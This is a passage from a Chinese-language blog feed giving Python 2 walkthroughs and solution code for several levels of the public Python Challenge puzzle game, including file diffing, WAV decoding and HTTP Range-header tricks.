opener.open(url).read()</span><br><span class="line">            param = re.findall(<span class="string">"and the next busynothing is ([0-9]+)"</span>, page_source)[<span class="number">0</span>]</span><br><span class="line">            ck = cj._cookies.values()[<span class="number">0</span>][<span class="string">'/'</span>][<span class="string">'info'</span>].value</span><br><span class="line">            info.append(ck)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%d -&gt; %s -&gt; %s"</span> % (times, param, ck)</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 匹配不到跳到异常</span></span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the end is : %d"</span> % times</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    message = <span class="string">""</span>.join(info)</span><br><span class="line">    <span class="keyword">print</span> message</span><br><span class="line">    <span class="comment"># 转义</span></span><br><span class="line">    message = urllib.unquote_plus(message)</span><br><span class="line">    result = message.decode(<span class="string">"bz2"</span>)</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---level 13 code ---#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># url = "?busynothing=".join([base_url, param])</span></span><br><span class="line">    <span class="comment"># page_source = opener.open(url).read()</span></span><br><span class="line">    cj._cookies.values()[<span class="number">0</span>][<span class="string">'/'</span>][<span class="string">'info'</span>].value = <span class="string">'the+flowers+are+on+their+way'</span></span><br><span class="line">    violin_source = opener.open(<span class="string">'http://www.pythonchallenge.com/pc/stuff/violin.php'</span>).read()</span><br><span class="line">    <span class="keyword">print</span> violin_source</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_18"><a href="http://www.pythonchallenge.com/pc/return/balloons.html" target="_blank" rel="external">python challenge 18</a></h3><p><code>http://www.pythonchallenge.com/pc/return/balloons.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18.jpg" alt="18"><br>页面标题：can you tell the difference?<br>明显的两张图片亮度不同，英文brightness.<br>进入该页面后再看源码提示：maybe consider deltas.gz<br>将该文件下载下来，解压后看到delta.txt里是分为两栏的16进制数据。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18-deltas.jpg" alt="18-deltas"><br>仔细对比两边内容，发现有部分重复的，也就是通过比较两栏内容，来分发字节。<br>左边特有的，右边特有的，公共部分，分别生成三张图片。<br>这里需要用到difflib模块来进行数据处理。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balloons</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> difflib</span><br><span class="line">    f_delta = open(<span class="string">'files/delta.txt'</span>, <span class="string">'r+'</span>)</span><br><span class="line">    deltas = f_delta.read().split(<span class="string">'\n'</span>)</span><br><span class="line">    f_delta.close()</span><br><span class="line"></span><br><span class="line">    left_data = []</span><br><span class="line">    right_data = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> deltas:</span><br><span class="line">        left_data.append(line[:<span class="number">53</span>]+<span class="string">'\n'</span>)</span><br><span class="line">        right_data.append(line[<span class="number">56</span>:]+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    diff = difflib.Differ()</span><br><span class="line">    cmp_result = list(diff.compare(left_data, right_data))</span><br><span class="line"></span><br><span class="line">    left_pic = open(<span class="string">'img/18-left-diff.png'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    right_pic = open(<span class="string">'img/18-right-diff.png'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    common_pic = open(<span class="string">'img/18-common.png'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> cmp_result:</span><br><span class="line">        bytes = [(chr(int(h, <span class="number">16</span>))) <span class="keyword">for</span> h <span class="keyword">in</span> line[<span class="number">2</span>:].split()]</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'-'</span>):</span><br><span class="line">            map(left_pic.write, bytes)</span><br><span class="line">        <span class="keyword">elif</span> line.startswith(<span class="string">'+'</span>):</span><br><span class="line">            map(right_pic.write, bytes)</span><br><span class="line">        <span class="keyword">elif</span> line.startswith(<span class="string">' '</span>):</span><br><span class="line">            map(common_pic.write, bytes)</span><br><span class="line"></span><br><span class="line">    right_pic.close()</span><br><span class="line">    left_pic.close()</span><br><span class="line">    common_pic.close()</span><br></pre></td></tr></table></figure></p>
<p>最后生成的三张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18-bin.jpg" alt="18-bin"><br>进入<a href="http://www.pythonchallenge.com/pc/hex/bin.html" target="_blank" rel="external">http://www.pythonchallenge.com/pc/hex/bin.html</a><br>用户名：butter 密码：fly</p>
<h3 id="python_challenge_19"><a href="http://www.pythonchallenge.com/pc/hex/bin.html" target="_blank" rel="external">python challenge 19</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/bin.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-19.jpg" alt="19"><br>看网页源码，base64加密一段音频数据indian.wav<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_bin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Authorization"</span>: <span class="string">"Basic YnV0dGVyOmZseQ=="</span></span><br><span class="line">    &#125;</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/hex/bin.html"</span>, headers=headers).text</span><br><span class="line">    wav_data = re.findall(<span class="string">r"base64([\s\S]+?)--"</span>, page_source)[<span class="number">0</span>].strip(<span class="string">"\n"</span>)</span><br><span class="line">    indian = open(<span class="string">"files/indian.wav"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    indian.write(base64.b64decode(wav_data))</span><br><span class="line">    indian.close()</span><br></pre></td></tr></table></figure></p>
<p>打开生成的音频文件，有个怪怪的声音：sorry..<br>打开sorry界面显示：what are you apologizing for<br>再回头看看图片，大陆和海洋的颜色是反转的，尝试将音频每一帧反转<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_bin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> wave</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Authorization"</span>: <span class="string">"Basic YnV0dGVyOmZseQ=="</span></span><br><span class="line">    &#125;</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/hex/bin.html"</span>, headers=headers).text</span><br><span class="line">    wav_data = re.findall(<span class="string">r"base64([\s\S]+?)--"</span>, page_source)[<span class="number">0</span>].strip(<span class="string">"\n"</span>)</span><br><span class="line">    indian = open(<span class="string">"files/indian.wav"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    indian.write(base64.b64decode(wav_data))</span><br><span class="line">    indian.close()</span><br><span class="line"></span><br><span class="line">    indian = wave.open(<span class="string">"files/indian.wav"</span>, <span class="string">"rb"</span>)</span><br><span class="line">    reverse = wave.open(<span class="string">"files/indian-reverse.wav"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    reverse.setnchannels(<span class="number">1</span>)</span><br><span class="line">    reverse.setframerate(indian.getframerate())</span><br><span class="line">    reverse.setsampwidth(indian.getsampwidth())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(indian.getnframes()):</span><br><span class="line">        reverse.writeframes(indian.readframes(<span class="number">1</span>)[::-<span class="number">1</span>])</span><br><span class="line">    indian.close()</span><br><span class="line">    reverse.close()</span><br></pre></td></tr></table></figure></p>
<p>播放下听听，You are a idiot ha ha ha ha ha ha …..<br>进入idiot.html显示：Now you should apologize,Continue to the next level进入下一关。</p>
<h3 id="python_challenge_20"><a href="http://www.pythonchallenge.com/pc/hex/idiot2.html" target="_blank" rel="external">python challenge 20</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/idiot2.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-20.jpg" alt="20"><br>页面标题：go away!<br>图片下边：but inspecting it carefully is allowed.<br>大概意思是围栏那边的是私有财产，请离开私有财产，虽然不允许进入，但可以观察。<br>没有一点思路，谷歌大法好，抓下图片包看下请求头信息：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-20-range.jpg" alt="20-range"><br>这里的Content-Range的值是: bytes 0-30202/2123456789，这看上去与所谓的“断点续传”十分相似。<br>从这个信息知道原始图片大小有2123456789个字节，但是目前的“unreal.jpg” 只有前面的30202 个字节，这就说明看到的“unreal.jpg”并不完整。<br>那就先要把“unreal.jpg”下载完全才行。<br>要指定请求的字节范围，需要在请求中加入一个叫Range的头，基本形式是“Range: bytes=1000-2345”。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Authorization"</span>: <span class="string">"Basic YnV0dGVyOmZseQ=="</span>,</span><br><span class="line">    <span class="string">"Range"</span>: <span class="string">"bytes=30203-"</span></span><br><span class="line">&#125;</span><br><span class="line">img = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/hex/unreal.jpg"</span>, headers=headers)</span><br><span class="line"><span class="keyword">print</span> img.text</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span><span class="string">u"Why don't you respect my privacy?\n"</span></span><br></pre></td></tr></table></figure></p>
<p>服务器返回了有意义的信息，因此写个遍历将所有信息打印出来。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def idiot2():</span><br><span class="line">    pic_url = "http://www.pythonchallenge.com/pc/hex/unreal.jpg"</span><br><span class="line">    next_range = 30203</span><br><span class="line">    end_range = 2123456789</span><br><span class="line">    while next_range &lt;= end_range:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            "Authorization": "Basic YnV0dGVyOmZseQ==",</span><br><span class="line">            "Range": "bytes=%d-" % next_range</span><br><span class="line">        &#125;</span><br><span class="line">        img = requests.get(pic_url, headers=headers)</span><br><span class="line">        if img.status_code == 206:</span><br><span class="line">            print "range : %d -&gt; %s" % (next_range, img.text)</span><br><span class="line">            content_range = img.headers.get("Content-Range")</span><br><span class="line">            next_range = re.findall(r"bytes.+-(\d+)/", content_range)[0]</span><br><span class="line">            next_range = int(next_range) + 1</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    range : 30203 -&gt; Why don't you respect my privacy?</span><br><span class="line">    range : 30237 -&gt; we can go on in this way for really long time.</span><br><span class="line">    range : 30284 -&gt; stop this!</span><br><span class="line">    range : 30295 -&gt; invader! invader!</span><br><span class="line">    range : 30313 -&gt; ok, invader. you are inside now.</span><br><span class="line">    Process finished with exit code 0</span><br></pre></td></tr></table></figure></p>
<p>信息中反复提到的入侵者invader，尝试更换下网址为invader.html。<br>页面显示：Yes! that’s you! 这提示，然并卵。。。<br>从前边入侵不行，那就从后边入侵试试？<br>将代码中next_range改为2123456789打印出来为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esrever ni emankcin wen ruoy si drowssap eht</span><br></pre></td></tr></table></figure></p>
<p>将其反过来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">end_text = <span class="string">"esrever ni emankcin wen ruoy si drowssap eht"</span></span><br><span class="line">result = [text_[::-<span class="number">1</span>] <span class="keyword">for</span> text_ <span class="keyword">in</span> end_text.split()[::-<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">print</span> <span class="string">" "</span>.join(result)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>the password <span class="keyword">is</span> your new nickname <span class="keyword">in</span> reverse</span><br></pre></td></tr></table></figure></p>
<p>通过读取Content-Range再入侵前一个得到信息：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range : 2123456743 -&gt; and it is hiding at 1152983631.</span><br></pre></td></tr></table></figure></p>
<p>通过这条信息得之其隐藏在1152983631，入侵之后得到pk开头的数据即zip包。<br>将其下载下来，解压需要密码，密码看前边的提示信息：<br>the password is your new nickname in reverse<br>新绰号即为入侵者invader，反过来为redavni。<br>解压过后生成两个文件，package.pack和readme.txt,打开readme文件内容为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Yes! This <span class="keyword">is</span> really level <span class="number">21</span> <span class="keyword">in</span> here.</span><br><span class="line">And yes, After you solve it, yo<span class="string">u'll be in level 22!</span><br><span class="line"></span><br><span class="line">Now for the level:</span><br><span class="line"></span><br><span class="line">* We used to play this game when we were kids</span><br><span class="line">* When I had no idea what to do, I looked backwards.</span></span><br></pre></td></tr></table></figure></p>
<p>已经进入了level 21.<br>完整代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">idiot2</span><span class="params">()</span>:</span></span><br><span class="line">    pic_url = <span class="string">"http://www.pythonchallenge.com/pc/hex/unreal.jpg"</span></span><br><span class="line">    next_range = <span class="number">30203</span></span><br><span class="line">    end_range = <span class="number">2123456789</span></span><br><span class="line">    <span class="keyword">while</span> next_range &lt;= end_range:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"Authorization"</span>: <span class="string">"Basic YnV0dGVyOmZseQ=="</span>,</span><br><span class="line">            <span class="string">"Range"</span>: <span class="string">"bytes=%d-"</span> % next_range</span><br><span class="line">        &#125;</span><br><span class="line">        img = requests.get(pic_url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> img.status_code == <span class="number">206</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"range : %d -&gt; %s"</span> % (next_range, img.text)</span><br><span class="line">            content_range = img.headers.get(<span class="string">"Content-Range"</span>)</span><br><span class="line">            next_range = re.findall(<span class="string">r"bytes.+-(\d+)/"</span>, content_range)[<span class="number">0</span>]</span><br><span class="line">            next_range = int(next_range) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># reverse</span></span><br><span class="line">    cur_range = <span class="number">2123456789</span></span><br><span class="line">    end_range = <span class="number">2123456789</span></span><br><span class="line">    is_download = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">while</span> cur_range &lt;= end_range:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"Authorization"</span>: <span class="string">"Basic YnV0dGVyOmZseQ=="</span>,</span><br><span class="line">            <span class="string">"Range"</span>: <span class="string">"bytes=%d-"</span> % cur_range</span><br><span class="line">        &#125;</span><br><span class="line">        img = requests.get(pic_url, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> img.status_code == <span class="number">206</span>:</span><br><span class="line">            <span class="keyword">if</span> is_download <span class="keyword">is</span> <span class="keyword">True</span>:</span><br><span class="line">                open(<span class="string">"files/invader.zip"</span>, <span class="string">"wb"</span>).write(img.content)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"range : %d -&gt; %s"</span> % (cur_range, img.text)</span><br><span class="line">            content_range = img.headers.get(<span class="string">"Content-Range"</span>)</span><br><span class="line">            cur_range = re.findall(<span class="string">r"bytes (\d+)-"</span>, content_range)[<span class="number">0</span>]</span><br><span class="line">            cur_range = int(cur_range) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            img_text = img.text</span><br><span class="line">            result = [text_[::-<span class="number">1</span>] <span class="keyword">for</span> text_ <span class="keyword">in</span> img_text.split()[::-<span class="number">1</span>]]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">" "</span>.join(result)</span><br><span class="line">        <span class="keyword">elif</span> img.status_code == <span class="number">416</span>:</span><br><span class="line">            cur_range = img_text.split()[-<span class="number">1</span>].strip(<span class="string">"."</span>)</span><br><span class="line">            cur_range = int(cur_range)</span><br><span class="line">            is_download = <span class="keyword">True</span></span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
<h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" re]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.com/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.com/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 0-10]]></title>
    <link href="http://blog.idhyt.com/2015/08/07/python-challenge-0-10/"/>
    <id>http://blog.idhyt.com/2015/08/07/python-challenge-0-10/</id>
    <published>2015-08-07T08:06:11.000Z</published>
    <updated>2015-12-31T12:07:21.000Z</updated>
    <content type="html"><![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="external">http://www.pythonchallenge.com/</a><br>题目出的也是充满想象力，斗智斗勇中。。。<br>解题代码整理在我的 <a href="https://github.com/idhyt/python_challenge" target="_blank" rel="external">github</a></p>
<h3 id="python_challenge_0"><a href="http://www.pythonchallenge.com/pc/def/0.html" target="_blank" rel="external">python challenge 0</a></h3><p><code>http://www.pythonchallenge.com/pc/def/0.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-0.jpg" alt="0"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2的38次幂</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">274877906944L</span></span><br></pre></td></tr></table></figure>
<h3 id="python_challenge_1"><a href="http://www.pythonchallenge.com/pc/def/274877906944.html" target="_blank" rel="external">python challenge 1</a></h3><p><code>http://www.pythonchallenge.com/pc/def/274877906944.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-1.jpg" alt="1"><br>通过图片可知道，所有字符右移两位即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">map_</span><span class="params">()</span>:</span></span><br><span class="line">    first_alpha = chr(ord(<span class="string">"m"</span>) + <span class="number">2</span>)</span><br><span class="line">    second_alpha = chr(ord(<span class="string">"a"</span>) + <span class="number">2</span>)</span><br><span class="line">    third_alpha = chr(ord(<span class="string">"p"</span>) + <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([first_alpha, second_alpha, third_alpha])</span><br><span class="line">&gt;&gt;&gt; ocr</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_2"><a href="http://www.pythonchallenge.com/pc/def/ocr.html" target="_blank" rel="external">python challenge 2</a></h3><p><code>http://www.pythonchallenge.com/pc/def/ocr.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-2.jpg" alt="2"><br>查找出现次数最少的字符，先是统计出所有字符出现的次数，然后获取出现次数最早的，要注意按照原来顺序排列。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ocr</span><span class="params">()</span>:</span></span><br><span class="line">    stats = &#123;&#125;</span><br><span class="line">    req = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/def/ocr.html"</span>)</span><br><span class="line">    page_source = req.text</span><br><span class="line">    mess_pattern = re.compile(<span class="string">r"(%%[\s\S]+)--&gt;"</span>, re.IGNORECASE)</span><br><span class="line">    mess_content = mess_pattern.findall(page_source)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print mess_content</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> mess_content:</span><br><span class="line">        <span class="keyword">if</span> character <span class="keyword">in</span> stats:</span><br><span class="line">            stats[character] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stats[character] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> key_, value_ <span class="keyword">in</span> stats.items():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%s -&gt; %d"</span> % (key_, value_)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a e i l q u t y</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(re.findall(<span class="string">r"[a-z]+"</span>, mess_content))</span><br><span class="line">&gt;&gt;&gt; <span class="string">u'equality'</span></span><br></pre></td></tr></table></figure>
<h3 id="python_challenge_3"><a href="http://www.pythonchallenge.com/pc/def/equality.html" target="_blank" rel="external">python challenge 3</a></h3><p><code>http://www.pythonchallenge.com/pc/def/equality.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-3.jpg" alt="3"><br>小写字符两边有三个大写字母,格式为aAAAaAAAa<br>AAAaAAA这种匹配是错误的，要保证两边都是三位大写字母<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equality</span><span class="params">()</span>:</span></span><br><span class="line">    req = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/def/equality.html"</span>)</span><br><span class="line">    page_source = req.text</span><br><span class="line">    mess_pattern = re.compile(<span class="string">r"kAewtloYgc[\s\S]+"</span>, re.IGNORECASE)</span><br><span class="line">    mess_content = mess_pattern.findall(page_source)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(re.findall(<span class="string">r"[a-z]&#123;1&#125;[A-Z]&#123;3&#125;([a-z]&#123;1&#125;)[A-Z]&#123;3&#125;[a-z]&#123;1&#125;"</span>, mess_content))</span><br><span class="line">&gt;&gt;&gt; <span class="string">u'linkedlist'</span></span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_4"><a href="http://www.pythonchallenge.com/pc/def/linkedlist.php" target="_blank" rel="external">python challenge 4</a></h3><p><code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-4.jpg" alt="4"><br>点击图片会有提示,然后更换链接参数继续,大概200多次即可得到答案。<br>其中正则不能只写”[0-9]+”,中间有陷阱：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There maybe misleading numbers <span class="keyword">in</span> the text. One example <span class="keyword">is</span> <span class="number">82683</span>\. Look only <span class="keyword">for</span> the next nothing <span class="keyword">and</span> the next nothing <span class="keyword">is</span> <span class="number">63579</span></span><br></pre></td></tr></table></figure>
<p>完整代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def linkedlist(times=1, param="123456"):</span><br><span class="line">    try:</span><br><span class="line">        url = "?nothing=".join(["http://www.pythonchallenge.com/pc/def/linkedlist.php", param])</span><br><span class="line">        page_source = requests.get(url).text</span><br><span class="line">        next_param = re.findall("and the next nothing is ([0-9]+)", page_source)[0]</span><br><span class="line">        print "%d -&gt; %s" % (times, next_param)</span><br><span class="line">        times += 1</span><br><span class="line">        linkedlist(times, next_param)</span><br><span class="line">    # 匹配不到跳到异常</span><br><span class="line">    except IndexError:</span><br><span class="line">        print "the right url is : %s" % url</span><br><span class="line">        return page_source</span><br><span class="line">&gt;&gt;&gt; the right url is : http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=66831</span><br><span class="line">    peak.html</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_5"><a href="http://www.pythonchallenge.com/pc/def/peak.html" target="_blank" rel="external">python challenge 5</a></h3><p><code>http://www.pythonchallenge.com/pc/def/peak.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-5.jpg" alt="5"><br>这关估计卡了不少人，从页面源码只能得到banner.p文件地址,即<a href="http://www.pythonchallenge.com/pc/def/banner.p" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/banner.p</a><br>跟我一样没有用过pickle模块的一般都解不出来，看到文件内容也是没有头绪的，通过上网查了资料才知道如何解题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 